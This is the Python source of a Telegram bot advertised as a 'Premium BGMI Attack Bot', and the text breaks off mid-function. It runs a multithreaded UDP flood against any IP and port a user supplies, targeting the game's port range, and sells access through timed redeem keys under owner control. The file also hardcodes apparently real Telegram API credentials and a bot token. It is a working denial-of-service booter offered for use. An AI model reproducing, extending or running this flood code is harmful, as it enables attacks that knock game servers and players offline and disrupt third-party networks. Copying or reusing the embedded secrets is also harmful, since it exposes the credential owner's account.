#!/usr/bin/env python3
"""
💎 ULTIMATE PREMIUM BGMI ATTACK BOT 💎
Unique Keys | Block/Delete | Video Auth | Full Premium
"""

import asyncio, json, random, os, time, socket, threading, logging, string, uuid
from datetime import datetime, timedelta
import pytz
from pyrogram import Client, filters
from pyrogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
)

# ═══════════════ LOGGING ═══════════════
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# ═══════════════ CONFIG ═══════════════
API_ID = 35140329
API_HASH = "011f638e4acadee178c59afffc80193d"
BOT_TOKEN = "8881462630:AAEQX_BDAkR9wRehuE2fO2RoCoNUybBwVWs"
OWNER_ID = 1987818347
OWNER_USERNAME = "BESTCHEAT_OWNER"

# ═══════════════ DATABASE FILES ═══════════════
VIDEO_DB = "videos.json"
USERS_DB = "users.json"
KEYS_DB = "keys.json"
BLOCKED_DB = "blocked.json"
LOGS_DB = "logs.json"

IST = pytz.timezone('Asia/Kolkata')
LINE = "━━━━━━━━━━━━━━━━━━━"
LINE_BIG = "━━━━━━━━━━━━━━━━━━━━━━"

# ═══════════════ SETTINGS ═══════════════
PREMIUM_THREADS = 5000
PREMIUM_TIME = 600

# ═══════════════ TRACKING ═══════════════
used_videos = []

# ═══════════════ DATABASE HELPERS ═══════════════
def jload(f, d=None):
    try:
        if os.path.exists(f):
            with open(f) as fl: return json.load(fl)
    except: pass
    return d if d is not None else {}

def jsave(f, d):
    with open(f, 'w') as fl: json.dump(d, fl, indent=2)

# ═══════════════ UNIQUE KEY GENERATOR ═══════════════
def generate_unique_key():
    """Generate truly unique key with prefix"""
    prefixes = ["BGMI", "VIP", "PRO", "ELITE", "LEGEND", "MYTHIC", "ULTRA", "NITRO"]
    prefix = random.choice(prefixes)
    segments = []
    for _ in range(4):
        seg = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
        segments.append(seg)
    
    unique_id = str(uuid.uuid4())[:8].upper()
    return f"{prefix}-{segments[0]}-{segments[1]}-{unique_id}"

def generate_short_key():
    """Generate short unique key"""
    chars = string.ascii_uppercase + string.digits
    return "BGMI-" + '-'.join(''.join(random.choice(chars) for _ in range(4)) for _ in range(3))

# ═══════════════ TIME PARSER ═══════════════
def parse_duration(time_str):
    """Parse time: 30m, 24h, 7d, 2w, 1mo"""
    if not time_str: return None
    time_str = time_str.lower().strip()
    
    try:
        if 'min' in time_str:
            return int(time_str.replace('min', '').replace('mins', '').strip()), 'minutes'
        elif time_str.endswith('m'):
            return int(time_str[:-1]), 'minutes'
        elif 'h' in time_str:
            return int(time_str.replace('h', '').replace('hr', '').replace('hrs', '').replace('hour', '').replace('hours', '').strip()), 'hours'
        elif 'd' in time_str:
            return int(time_str.replace('d', '').replace('day', '').replace('days', '').strip()), 'days'
        elif 'w' in time_str:
            return int(time_str.replace('w', '').replace('wk', '').replace('wks', '').replace('week', '').replace('weeks', '').strip()), 'weeks'
        elif 'mo' in time_str:
            return int(time_str.replace('mo', '').replace('month', '').replace('months', '').strip()), 'months'
        else:
            return int(time_str), 'hours'
    except:
        return None

def calc_expiry(value, unit):
    """Calculate expiry datetime"""
    now = datetime.now(IST)
    if unit == 'minutes': return now + timedelta(minutes=value)
    elif unit == 'hours': return now + timedelta(hours=value)
    elif unit == 'days': return now + timedelta(days=value)
    elif unit == 'weeks': return now + timedelta(weeks=value)
    elif unit == 'months': return now + timedelta(days=value * 30)
    return now + timedelta(hours=value)

def format_duration(value, unit):
    """Format duration nicely"""
    names = {'minutes': 'Minute', 'hours': 'Hour', 'days': 'Day', 'weeks': 'Week', 'months': 'Month'}
    name = names.get(unit, unit)
    return f"{value} {name}{'s' if value != 1 else ''}"

def get_remaining(expiry_str):
    """Get remaining time string"""
    try:
        expiry = datetime.fromisoformat(expiry_str)
        now = datetime.now(IST)
        if now >= expiry: return "EXPIRED", True
        
        diff = expiry - now
        days = diff.days
        hours = diff.seconds // 3600
        minutes = (diff.seconds % 3600) // 60
        
        if days > 30: return f"{days//30}M+", False
        elif days > 0: return f"{days}D {hours}H", False
        elif hours > 0: return f"{hours}H {minutes}M", False
        else: return f"{minutes}M", False
    except:
        return "ERROR", False

# ═══════════════ VIDEO FUNCTIONS ═══════════════
def get_vids(): return jload(VIDEO_DB, [])

def add_vid(path):
    vids = get_vids()
    vid = len(vids) + 1
    vids.append({"id": vid, "path": path, "name": os.path.basename(path), "added": datetime.now(IST).isoformat()})
    jsave(VIDEO_DB, vids)
    return vid

def rand_vid():
    global used_videos
    vids = get_vids()
    if not vids: return None
    avail = [v for v in vids if v["id"] not in used_videos]
    if not avail:
        used_videos.clear()
        avail = vids
    v = random.choice(avail)
    used_videos.append(v["id"])
    return v

def del_vid(vid):
    vids = get_vids()
    for i, v in enumerate(vids):
        if v["id"] == vid:
            if os.path.exists(v["path"]): os.remove(v["path"])
            vids.pop(i)
            jsave(VIDEO_DB, vids)
            return True
    return False

# ═══════════════ USER FUNCTIONS ═══════════════
def get_users():
    return jload(USERS_DB, {"premium": [], "keys": {}, "history": {}})

def get_blocked():
    return jload(BLOCKED_DB, [])

def is_blocked(uid):
    return str(uid) in get_blocked()

def block_user(uid):
    blocked = get_blocked()
    if str(uid) not in blocked:
        blocked.append(str(uid))
        jsave(BLOCKED_DB, blocked)
        return True
    return False

def unblock_user(uid):
    blocked = get_blocked()
    if str(uid) in blocked:
        blocked.remove(str(uid))
        jsave(BLOCKED_DB, blocked)
        return True
    return False

def check_access(uid):
    """Check if user has valid access"""
    if is_blocked(uid): return False, "BLOCKED"
    if uid == OWNER_ID: return True, "OWNER"
    
    users = get_users()
    uid_str = str(uid)
    
    if uid_str in users.get("premium", []):
        return True, "PREMIUM"
    
    user_keys = users.get("keys", {}).get(uid_str, {})
    if user_keys:
        expiry = user_keys.get("expiry")
        if expiry:
            try:
                if datetime.now(IST) < datetime.fromisoformat(expiry):
                    remaining, _ = get_remaining(expiry)
                    return True, f"KEY ({remaining})"
                else:
                    del users["keys"][uid_str]
                    jsave(USERS_DB, users)
            except: pass
    
    return False, "NONE"

def get_user_info(uid):
    """Get full user info"""
    access, a_type = check_access(uid)
    
    info = {
        "access": access,
        "type": a_type,
        "threads": PREMIUM_THREADS if access else 0,
        "max_time": PREMIUM_TIME if access else 0,
        "expiry": None,
        "remaining": None,
        "blocked": is_blocked(uid)
    }
    
    if a_type.startswith("KEY"):
        users = get_users()
        uk = users.get("keys", {}).get(str(uid), {})
        if uk:
            info["expiry"] = uk.get("expiry")
            if info["expiry"]:
                info["remaining"], _ = get_remaining(info["expiry"])
    
    return info

def grant_access(uid, key_name, duration_str, expiry):
    """Grant key access to user"""
    users = get_users()
    uid_str = str(uid)
    
    if "keys" not in users: users["keys"] = {}
    
    users["keys"][uid_str] = {
        "key_name": key_name,
        "duration": duration_str,
        "expiry": expiry.isoformat(),
        "granted_at": datetime.now(IST).isoformat()
    }
    
    # Add to history
    if "history" not in users: users["history"] = {}
    if uid_str not in users["history"]: users["history"][uid_str] = []
    users["history"][uid_str].append({
        "key_name": key_name,
        "duration": duration_str,
        "granted_at": datetime.now(IST).isoformat()
    })
    
    jsave(USERS_DB, users)
    return True

def remove_expired():
    """Remove expired users"""
    users = get_users()
    removed = 0
    
    if "keys" in users:
        expired = []
        for uid, data in users["keys"].items():
            try:
                if datetime.now(IST) >= datetime.fromisoformat(data["expiry"]):
                    expired.append(uid)
            except: expired.append(uid)
        
        for uid in expired:
            del users["keys"][uid]
            removed += 1
        
        if removed > 0: jsave(USERS_DB, users)
    
    return removed

# ═══════════════ KEY FUNCTIONS ═══════════════
def get_keys():
    return jload(KEYS_DB, {})

def create_new_key(name, time_str):
    """Create new unique key"""
    keys = get_keys()
    
    # Generate unique key
    key_code = generate_unique_key()
    while key_code in keys:
        key_code = generate_unique_key()
    
    parsed = parse_duration(time_str)
    if not parsed:
        return None, "❌ Invalid time! Use: 30m, 24h, 7d, 2w, 1mo"
    
    value, unit = parsed
    duration_display = format_duration(value, unit)
    
    keys[key_code] = {
        "name": name,
        "time_value": value,
        "time_unit": unit,
        "duration_display": duration_display,
        "created": datetime.now(IST).isoformat(),
        "created_by": "OWNER",
        "used_by": None,
        "used_at": None,
        "active": True,
        "blocked": False
    }
    
    jsave(KEYS_DB, keys)
    return key_code, f"✅ **KEY GENERATED!**\n\n🔑 `{key_code}`\n📛 {name}\n⏱️ {duration_display}\n📅 Created: {datetime.now(IST).strftime('%d %b, %I:%M %p')}"

def delete_key_completely(key_code):
    """Delete key from database"""
    keys = get_keys()
    if key_code in keys:
        del keys[key_code]
        jsave(KEYS_DB, keys)
        return True
    return False

def block_key(key_code):
    """Block a key (can't be redeemed)"""
    keys = get_keys()
    if key_code in keys:
        keys[key_code]["active"] = False
        keys[key_code]["blocked"] = True
        jsave(KEYS_DB, keys)
        return True
    return False

def unblock_key(key_code):
    """Unblock a key"""
    keys = get_keys()
    if key_code in keys:
        keys[key_code]["active"] = True
        keys[key_code]["blocked"] = False
        jsave(KEYS_DB, keys)
        return True
    return False

def redeem_key_code(key_code, user_id):
    """Redeem a key"""
    keys = get_keys()
    
    if key_code not in keys:
        return False, "❌ **INVALID KEY!**\nThis key does not exist."
    
    key = keys[key_code]
    
    if key.get("blocked", False):
        return False, "🚫 **KEY BLOCKED!**\nThis key has been blocked by admin."
    
    if not key["active"]:
        return False, "❌ **KEY ALREADY USED!**\nThis key has already been redeemed."
    
    if key["used_by"] is not None:
        return False, "❌ **KEY ALREADY REDEEMED!**\nGet a new key from admin."
    
    # Calculate expiry
    expiry = calc_expiry(key["time_value"], key["time_unit"])
    
    # Grant access
    grant_access(user_id, key["name"], key["duration_display"], expiry)
    
    # Mark as used
    key["used_by"] = str(user_id)
    key["used_at"] = datetime.now(IST).isoformat()
    key["active"] = False
    jsave(KEYS_DB, keys)
    
    return True, f"""
🎉 **KEY REDEEMED SUCCESSFULLY!**

{LINE}
📛 **Plan:** {key['name']}
⏱️ **Duration:** {key['duration_display']}
📅 **Expires:** {expiry.strftime('%d %B %Y, %I:%M %p')}
{LINE}

🔓 You now have full access!
📋 Send `/start` to begin
"""

def list_keys_detailed():
    """Get detailed key list"""
    keys = get_keys()
    active = []
    used = []
    blocked = []
    
    for k, v in keys.items():
        item = {"key": k, **v}
        if v.get("blocked", False):
            blocked.append(item)
        elif v["active"] and v["used_by"] is None:
            active.append(item)
        else:
            used.append(item)
    
    return active, used, blocked

# ═══════════════ LOG FUNCTIONS ═══════════════
def add_log(action, details):
    """Add action to logs"""
    logs = jload(LOGS_DB, [])
    logs.append({
        "action": action,
        "details": details,
        "time": datetime.now(IST).isoformat()
    })
    if len(logs) > 500: logs = logs[-500:]
    jsave(LOGS_DB, logs)

# ═══════════════ HELPERS ═══════════════
def get_time():
    return datetime.now(IST).strftime("%I:%M %p")

def tstr(s):
    if s < 60: return f"{int(s)}s"
    m, sec = int(s//60), int(s%60)
    return f"{m}m {sec}s" if s < 3600 else f"{int(s//3600)}h {int((s%3600)//60)}m"

def get_unauth_video_text():
    """Random unauthorized message"""
    messages = [
        "🚫 **ACCESS DENIED!**\n\nYou don't have permission to use this bot.\n\n🔑 Get a redeem key from admin!\n📲 Contact: @{OWNER_USERNAME}",
        "🔒 **RESTRICTED AREA!**\n\nThis bot is for authorized users only.\n\n🔑 Use `/redeem KEY` to unlock!\n📲 DM: @{OWNER_USERNAME}",
        "⛔ **UNAUTHORIZED!**\n\nYou need a valid key to access this bot.\n\n🔑 Redeem: `/redeem KEY`\n📲 Contact: @{OWNER_USERNAME}",
        "🛡️ **PROTECTED BOT!**\n\nAccess is restricted to key holders only.\n\n🔑 Get key from: @{OWNER_USERNAME}\n📋 Then use: `/redeem KEY`",
    ]
    return random.choice(messages).replace("{OWNER_USERNAME}", OWNER_USERNAME)

# ═══════════════ ATTACK ENGINE ═══════════════
class Attack:
    def __init__(self):
        self.on = False
        self.pkts = 0
        self.bytes_out = 0
        self.lock = threading.Lock()
    
    def flood(self, ip, port, end):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
        s.settimeout(0.001)
        ports = list(range(7000, 15000)) + [17500, 20000, 27000]
        while self.on and time.time() < end:
            try:
                for _ in range(20):
                    if not self.on: break
                    p = random.randbytes(random.randint(500, 1500))
                    s.sendto(p, (ip, random.choice(ports)))
                    with self.lock: self.pkts += 1; self.bytes_out += len(p)
            except: pass
        s.close()
    
    def start(self, ip, port, dur, threads):
        self.on = True; self.pkts = 0; self.bytes_out = 0
        end = time.time() + dur
        workers = [threading.Thread(target=self.flood, args=(ip, port, end)) for _ in range(threads)]
        for w in workers: w.daemon = True; w.start()
        time.sleep(dur); self.on = False
        e = max(dur, 0.1)
        return {'pkts': self.pkts, 'mbps': (self.bytes_out*8)/(e*1e6), 'mb': self.bytes_out/1024/1024}

attacker = Attack()
attacking = False
ainfo = {}
amsg = None

# ═══════════════ BOT ═══════════════
app = Client("ultimate_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ═══════════════ KEYBOARDS ═══════════════
def main_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💀 ATTACK", callback_data="attack_menu"),
         InlineKeyboardButton("⛔ STOP", callback_data="stop_btn")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status_btn"),
         InlineKeyboardButton("👤 PROFILE", callback_data="profile")],
        [InlineKeyboardButton("🎬 VIDEOS", callback_data="video_menu"),
         InlineKeyboardButton("💎 PREMIUM", callback_data="premium")],
        [InlineKeyboardButton("🔑 REDEEM KEY", callback_data="redeem_menu"),
         InlineKeyboardButton("ℹ️ HELP", callback_data="help")],
        [InlineKeyboardButton("👑 ADMIN", callback_data="admin_menu")],
    ])

def back_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])

# ═══════════════ SEND WITH VIDEO ═══════════════
async def send_vid(chat_id, text, kb=None, vid=None):
    if vid is None: vid = rand_vid()
    try:
        if vid and os.path.exists(vid["path"]):
            return await app.send_video(chat_id, vid["path"], caption=text, reply_markup=kb)
        return await app.send_message(chat_id, text, reply_markup=kb)
    except:
        return await app.send_message(chat_id, text, reply_markup=kb)

# ═══════════════ START ═══════════════
@app.on_message(filters.command("start"))
async def start_cmd(client, msg):
    uid = msg.from_user.id
    user = msg.from_user
    
    access, a_type = check_access(uid)
    
    if not access:
        vid = rand_vid()
        text = get_unauth_video_text()
        await send_vid(msg.chat.id, text, None, vid)
        return
    
    info = get_user_info(uid)
    vid = rand_vid()
    
    expiry_text = ""
    if info.get("remaining"): expiry_text += f"\n⏳ **Remaining:** `{info['remaining']}`"
    if info.get("expiry"):
        try:
            exp = datetime.fromisoformat(info["expiry"])
            expiry_text += f"\n📅 **Expires:** `{exp.strftime('%d %b %Y, %I:%M %p')}`"
        except: pass
    
    text = f"""
💎 **PREMIUM BGMI ATTACK BOT** 💎

{LINE}
👤 **{user.first_name}**
🆔 `{uid}`
💳 **{a_type}**{expiry_text}
{LINE}
⚡ `{info['threads']}` Threads
⏱️ `{info['max_time']}s` Max Time
📹 `{len(get_vids())}` Videos
{LINE}
⚔️ `/attack IP PORT TIME`
📋 `/attack 1.2.3.4 8080 120`
🎮 BGMI Ports: 7000-15000
{LINE}

🔽 **SELECT OPTION:**
"""
    await send_vid(msg.chat.id, text, main_kb(), vid)

# ═══════════════ REDEEM ═══════════════
@app.on_message(filters.command("redeem"))
async def redeem_cmd(client, msg):
    uid = msg.from_user.id
    
    access, a_type = check_access(uid)
    if access:
        info = get_user_info(uid)
        return await msg.reply_text(
            f"✅ **ALREADY UNLOCKED!**\n\n{LINE}\n"
            f"💳 Type: {a_type}\n"
            f"⏳ Remaining: {info.get('remaining', 'N/A')}\n"
            f"{LINE}\n\nUse /start for menu"
        )
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text(
            f"🔑 **REDEEM KEY**\n\n{LINE}\n"
            f"📋 `/redeem KEY`\n"
            f"🔑 `/redeem BGMI-XXXX-XXXX-XXXX`\n"
            f"{LINE}\n"
            f"📲 Get key: @{OWNER_USERNAME}\n\n"
            f"⏱️ Key Examples:\n"
            f"• 30m = 30 Min\n"
            f"• 24h = 24 Hours\n"
            f"• 7d = 7 Days\n"
            f"• 2w = 2 Weeks\n"
            f"• 1mo = 1 Month"
        )
    
    key = parts[1].upper()
    success, message = redeem_key_code(key, uid)
    
    if success:
        add_log("KEY_REDEEMED", f"User {uid} redeemed key: {key}")
        await msg.reply_text(message)
    else:
        await msg.reply_text(f"{message}\n\n📲 Contact: @{OWNER_USERNAME}")

# ═══════════════ ATTACK ═══════════════
@app.on_message(filters.command("attack"))
async def attack_cmd(client, msg):
    global attacking, ainfo, amsg
    uid = msg.from_user.id
    
    access, a_type = check_access(uid)
    if not access:
        vid = rand_vid()
        return await send_vid(msg.chat.id, get_unauth_video_text(), None, vid)
    
    if attacking:
        e = time.time() - ainfo['start']
        return await msg.reply_text(f"⚠️ Already attacking! {int(e)}s\n🛑 /stop")
    
    parts = msg.text.split()
    if len(parts) < 4:
        return await msg.reply_text("⚠️ `/attack IP PORT TIME`\n📋 `/attack 1.2.3.4 8080 120`")
    
    ip = parts[1]
    try: port = int(parts[2])
    except: return await msg.reply_text("❌ Invalid port!")
    try: dur = int(parts[3])
    except: return await msg.reply_text("❌ Invalid time!")
    
    info = get_user_info(uid)
    threads = info['threads']
    max_t = info['max_time']
    if dur > max_t: dur = max_t
    
    ainfo = {'ip': ip, 'port': port, 'time': dur, 'start': time.time()}
    attacking = True
    
    vid = rand_vid()
    text = f"💀 **ATTACK STARTED!**\n🎯 `{ip}:{port}`\n⏱️ `{dur}s`\n🧵 `{threads}` Threads"
    amsg = await send_vid(msg.chat.id, text, None, vid)
    
    add_log("ATTACK_START", f"User {uid} attacked {ip}:{port} for {dur}s")
    
    async def live():
        t0 = time.time()
        while attacking:
            await asyncio.sleep(1.5)
            try:
                e = time.time() - t0
                if e >= dur: break
                pct = (e/dur)*100
                bar = "█"*int(pct/5) + "░"*(20-int(pct/5))
                mbps = (attacker.bytes_out*8)/(e*1e6) if e>0 else 0
                
                await amsg.edit_text(
                    f"💀 **ATTACKING!**\n"
                    f"🎯 `{ip}:{port}`\n"
                    f"⏱️ `{int(e)}s` / `{dur}s`\n"
                    f"[{bar}] `{pct:.0f}%`\n"
                    f"📦 `{attacker.pkts:,}` pkts\n"
                    f"📶 `{mbps:.1f}` Mbps\n"
                    f"🛑 `/stop`"
                )
            except: pass
    
    asyncio.create_task(live())
    
    loop = asyncio.get_event_loop()
    stats = await loop.run_in_executor(None, attacker.start, ip, port, dur, threads)
    attacking = False
    
    add_log("ATTACK_END", f"User {uid} finished attack on {ip}:{port}")
    
    vid = rand_vid()
    done = f"✅ **DONE!**\n🎯 `{ip}:{port}`\n📦 `{stats['pkts']:,}` pkts\n📶 `{stats['mbps']:.1f}` Mbps\n🔄 `/attack IP PORT TIME`"
    
    if vid and os.path.exists(vid["path"]):
        await app.send_video(msg.chat.id, vid["path"], caption=done)
    try: await amsg.edit_text(done)
    except: pass

@app.on_message(filters.command("stop"))
async def stop_cmd(client, msg):
    global attacking
    if not check_access(msg.from_user.id)[0]: return
    if attacking:
        attacker.on = False; attacking = False
        await msg.reply_text("⛔ **STOPPED!**")
    else:
        await msg.reply_text("💤 No attack!")

@app.on_message(filters.command("status"))
async def status_cmd(client, msg):
    if not check_access(msg.from_user.id)[0]: return
    if attacking:
        e = time.time() - ainfo['start']
        mbps = (attacker.bytes_out*8)/(e*1e6) if e>0 else 0
        await msg.reply_text(f"🟢 **ATTACKING!**\n⏱️ {int(e)}s\n📦 {attacker.pkts:,} pkts\n📶 {mbps:.1f} Mbps")
    else:
        await msg.reply_text("💤 IDLE\n⚔️ /attack IP PORT TIME")

# ═══════════════ OWNER COMMANDS ═══════════════

@app.on_message(filters.command("genkey"))
async def gen_key_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    
    parts = msg.text.split()
    if len(parts) < 3:
        return await msg.reply_text(
            f"🔑 **GENERATE UNIQUE KEY**\n\n{LINE}\n"
            f"📋 `/genkey NAME TIME`\n\n"
            f"📌 **Examples:**\n"
            f"`/genkey Test 30m` - 30 Min\n"
            f"`/genkey VIP 24h` - 24 Hours\n"
            f"`/genkey Premium 7d` - 7 Days\n"
            f"`/genkey Ultra 2w` - 2 Weeks\n"
            f"`/genkey Legend 1mo` - 1 Month\n\n"
            f"🔑 Each key is **UNIQUE**!\n"
            f"⏱️ Units: m=min, h=hour, d=day, w=week, mo=month"
        )
    
    name = parts[1]
    time_str = parts[2]
    
    result, message = create_new_key(name, time_str)
    
    if result:
        add_log("KEY_CREATED", f"Key: {result} | {name} | {time_str}")
        await msg.reply_text(message)
    else:
        await msg.reply_text(message)

@app.on_message(filters.command("keys"))
async def list_keys_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    
    active, used, blocked = list_keys_detailed()
    
    text = f"🔑 **KEY MANAGEMENT**\n\n{LINE}\n"
    
    text += f"🟢 **ACTIVE ({len(active)}):**\n"
    if active:
        for k in active[:5]:
            text += f"• `{k['key'][:20]}...` - {k['name']} ({k.get('duration_display', 'N/A')})\n"
        if len(active) > 5: text += f"... and {len(active)-5} more\n"
    else: text += "• None\n"
    
    text += f"\n🔴 **USED ({len(used)}):**\n"
    if used:
        for k in used[:3]:
            text += f"• {k['name']} → `{k.get('used_by', 'N/A')}`\n"
        if len(used) > 3: text += f"... and {len(used)-3} more\n"
    else: text += "• None\n"
    
    text += f"\n🚫 **BLOCKED ({len(blocked)}):**\n"
    if blocked:
        for k in blocked[:3]:
            text += f"• `{k['key'][:20]}...`\n"
    else: text += "• None\n"
    
    text += f"\n{LINE}\n📊 Total: {len(active)+len(used)+len(blocked)}"
    
    await msg.reply_text(text)

@app.on_message(filters.command("delkey"))
async def del_key_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text("❌ `/delkey KEY`")
    
    key = parts[1].upper()
    if delete_key_completely(key):
        add_log("KEY_DELETED", f"Key: {key}")
        await msg.reply_text(f"🗑️ **KEY DELETED!**\n`{key}`")
    else:
        await msg.reply_text("❌ Key not found!")

@app.on_message(filters.command("blockkey"))
async def block_key_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text("❌ `/blockkey KEY`")
    
    key = parts[1].upper()
    if block_key(key):
        add_log("KEY_BLOCKED", f"Key: {key}")
        await msg.reply_text(f"🚫 **KEY BLOCKED!**\n`{key}`")
    else:
        await msg.reply_text("❌ Key not found!")

@app.on_message(filters.command("unblockkey"))
async def unblock_key_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text("❌ `/unblockkey KEY`")
    
    key = parts[1].upper()
    if unblock_key(key):
        add_log("KEY_UNBLOCKED", f"Key: {key}")
        await msg.reply_text(f"✅ **KEY UNBLOCKED!**\n`{key}`")
    else:
        await msg.reply_text("❌ Key not found!")

@app.on_message(filters.command("blockuser"))
async def block_user_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    parts = msg.text.split()
    if len(parts) != 2: return await msg.reply_text("/blockuser USER_ID")
    
    if block_user(parts[1]):
        await msg.reply_text(f"🚫 User `{parts[1]}` blocked!")
    else:
        await msg.reply_text("Already blocked!")

@app.on_message(filters.command("unblockuser"))
async def unblock_user_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    parts = msg.text.split()
    if len(parts) != 2: return await msg.reply_text("/unblockuser USER_ID")
    
    if unblock_user(parts[1]):
        await msg.reply_text(f"✅ User `{parts[1]}` unblocked!")
    else:
        await msg.reply_text("Not blocked!")

@app.on_message(filters.command("clearexpired"))
async def clear_expired_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    removed = remove_expired()
    await msg.reply_text(f"🔄 **Cleaned!**\n🗑️ {removed} expired users removed!")

# ═══════════════ VIDEO COMMANDS ═══════════════
@app.on_message(filters.command("addvideo"))
async def add_video_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    if msg.reply_to_message and msg.reply_to_message.video:
        s = await msg.reply_text("⏳ Downloading...")
        try:
            path = await msg.reply_to_message.download()
            vid = add_vid(path)
            await s.edit_text(f"✅ Video #{vid} added! Total: {len(get_vids())}")
        except Exception as e:
            await s.edit_text(f"❌ Error: {e}")
    else:
        await msg.reply_text("❌ Reply to a video!")

@app.on_message(filters.command("videos"))
async def list_vids_cmd(client, msg):
    if not check_access(msg.from_user.id)[0]: return
    vids = get_vids()
    if not vids: return await msg.reply_text("📹 No videos!")
    text = f"📹 **Videos ({len(vids)}):**\n\n"
    for v in vids[:15]:
        text += f"#{v['id']} `{v['name'][:30]}`\n"
    await msg.reply_text(text)

@app.on_message(filters.command("delvideo"))
async def del_vid_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    parts = msg.text.split()
    if len(parts) != 2: return await msg.reply_text("/delvideo ID")
    try:
        if del_vid(int(parts[1])):
            await msg.reply_text(f"✅ Deleted!")
        else:
            await msg.reply_text("❌ Not found!")
    except:
        await msg.reply_text("❌ Invalid ID!")

# ═══════════════ STATS ═══════════════
@app.on_message(filters.command("stats"))
async def stats_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    vids = get_vids()
    users = get_users()
    active_keys, used_keys, blocked_keys = list_keys_detailed()
    logs = jload(LOGS_DB, [])
    size = sum(os.path.getsize(v["path"]) for v in vids if os.path.exists(v["path"]))
    
    await msg.reply_text(
        f"📊 **BOT STATISTICS**\n\n{LINE}\n"
        f"📹 Videos: {len(vids)} ({size/(1024*1024):.1f} MB)\n"
        f"💎 Premium: {len(users.get('premium', []))}\n"
        f"🔑 Key Users: {len(users.get('keys', {}))}\n"
        f"🟢 Active Keys: {len(active_keys)}\n"
        f"🔴 Used Keys: {len(used_keys)}\n"
        f"🚫 Blocked: {len(blocked_keys)}\n"
        f"📝 Logs: {len(logs)}\n"
        f"⚡ Attack: {'🟢 On' if attacking else '💤 Idle'}\n"
        f"{LINE}\n"
        f"🕐 {get_time()} | 📅 {datetime.now(IST).strftime('%d %b %Y')}"
    )

# ═══════════════ CALLBACKS ═══════════════
@app.on_callback_query()
async def callbacks(client, cb: CallbackQuery):
    data = cb.data
    uid = cb.from_user.id
    await cb.answer()
    
    if data == "back":
        user = cb.from_user
        access, a_type = check_access(uid)
        
        if not access:
            vid = rand_vid()
            text = get_unauth_video_text()
            try: await cb.message.delete()
            except: pass
            await send_vid(cb.message.chat.id, text, None, vid)
            return
        
        vid = rand_vid()
        info = get_user_info(uid)
        text = f"💎 **MAIN MENU**\n\n{LINE}\n👤 {user.first_name}\n💳 {info['type']}\n{LINE}\n🔽 Select:"
        
        try: await cb.message.delete()
        except: pass
        await send_vid(cb.message.chat.id, text, main_kb(), vid)
    
    elif data == "attack_menu":
        info = get_user_info(uid)
        await cb.message.edit_text(
            f"💀 **ATTACK**\n\n{LINE}\n"
            f"⚔️ `/attack IP PORT TIME`\n"
            f"📋 `/attack 1.2.3.4 8080 120`\n"
            f"{LINE}\n🎮 BGMI: 7000-15000\n"
            f"⚡ {info['threads']} Threads\n"
            f"⏱️ {info['max_time']}s Max",
            reply_markup=back_kb()
        )
    
    elif data == "stop_btn":
        if attacking: attacker.on = False; await cb.answer("⛔ Stopped!")
        else: await cb.answer("💤 No attack")
    
    elif data == "status_btn":
        if attacking:
            e = time.time() - ainfo['start']
            await cb.answer(f"🟢 {int(e)}s | {attacker.pkts:,} pkts", show_alert=True)
        else: await cb.answer("💤 IDLE")
    
    elif data == "profile":
        info = get_user_info(uid)
        expiry_text = ""
        if info.get("remaining"): expiry_text += f"\n⏳ Remaining: `{info['remaining']}`"
        if info.get("expiry"):
            try:
                exp = datetime.fromisoformat(info["expiry"])
                expiry_text += f"\n📅 Expires: `{exp.strftime('%d %b, %I:%M %p')}`"
            except: pass
        
        await cb.message.edit_text(
            f"👤 **PROFILE**\n\n{LINE}\n"
            f"🆔 `{uid}`\n👤 {cb.from_user.first_name}\n"
            f"💳 {info['type']}{expiry_text}\n"
            f"⚡ {info['threads']} Threads\n"
            f"⏱️ {info['max_time']}s Max\n"
            f"🚫 {'BLOCKED' if info['blocked'] else 'Active'}",
            reply_markup=back_kb()
        )
    
    elif data == "premium":
        await cb.message.edit_text(
            f"💎 **PREMIUM ACCESS**\n\n{LINE}\n"
            f"⚡ {PREMIUM_THREADS} Threads\n"
            f"⏱️ {PREMIUM_TIME}s Max Time\n"
            f"👑 Priority Support\n"
            f"🎬 Exclusive Videos\n\n"
            f"🔑 Get redeem key from admin!\n"
            f"📲 @{OWNER_USERNAME}",
            reply_markup=back_kb()
        )
    
    elif data == "video_menu":
        await cb.message.edit_text(
            f"🎬 **VIDEOS** ({len(get_vids())})\n\n{LINE}\n"
            f"📤 /addvideo (reply)\n📋 /videos\n🗑️ /delvideo ID",
            reply_markup=back_kb()
        )
    
    elif data == "redeem_menu":
        access, a_type = check_access(uid)
        if access:
            info = get_user_info(uid)
            await cb.message.edit_text(
                f"✅ **ACCESS ACTIVE!**\n\n{LINE}\n"
                f"💳 {a_type}\n⏳ {info.get('remaining', 'N/A')}\n"
                f"{LINE}\nUse /attack to start!",
                reply_markup=back_kb()
            )
        else:
            await cb.message.edit_text(
                f"🔑 **REDEEM KEY**\n\n{LINE}\n"
                f"📋 `/redeem KEY`\n🔑 `/redeem BGMI-XXXX-XXXX-XXXX`\n"
                f"{LINE}\n📲 Get key: @{OWNER_USERNAME}\n\n"
